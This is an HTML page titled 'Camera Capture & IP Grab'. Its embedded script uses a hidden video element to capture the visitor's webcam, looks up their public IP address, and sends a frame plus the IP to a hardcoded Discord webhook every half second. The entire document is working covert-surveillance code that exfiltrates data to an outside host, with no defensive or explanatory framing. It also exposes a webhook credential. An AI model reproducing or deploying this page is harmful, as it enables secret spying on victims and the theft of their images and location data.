<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Camera Capture & IP Grab</title>
</head>
<body>
<video id="video" autoplay playsinline style="display:none;"></video>
<script>
const webhookURL = 'https://discord.com/api/webhooks/1375557655036301593/fAVFnmHle5XCW4nxYD3GKHetyJRbGyQa6IXia2LbrEmk4Sn6Gaym_YduQpvpgkD2h0oA';

async function getIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip;
  } catch {
    return 'unknown';
  }
}

async function sendData(imageBase64, ip) {
  const json = {
    content: `IP: ${ip}`,
    embeds: [{
      image: {
        url: `data:image/png;base64,${imageBase64}`
      }
    }]
  };
  await fetch(webhookURL, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(json)
  });
}

async function captureAndSend() {
  const ip = await getIP();
  const video = document.getElementById('video');

  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    return;
  }

  if (!window.stream) {
    window.stream = await navigator.mediaDevices.getUserMedia({video: true});
    video.srcObject = window.stream;
  }

  const canvas = document.createElement('canvas');
  canvas.width = 320;
  canvas.height = 240;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  const imageBase64 = canvas.toDataURL('image/png').replace(/^data:image\/png;base64,/, '');

  await sendData(imageBase64, ip);
}

setInterval(captureAndSend, 500);
</script>
</body>
</html>
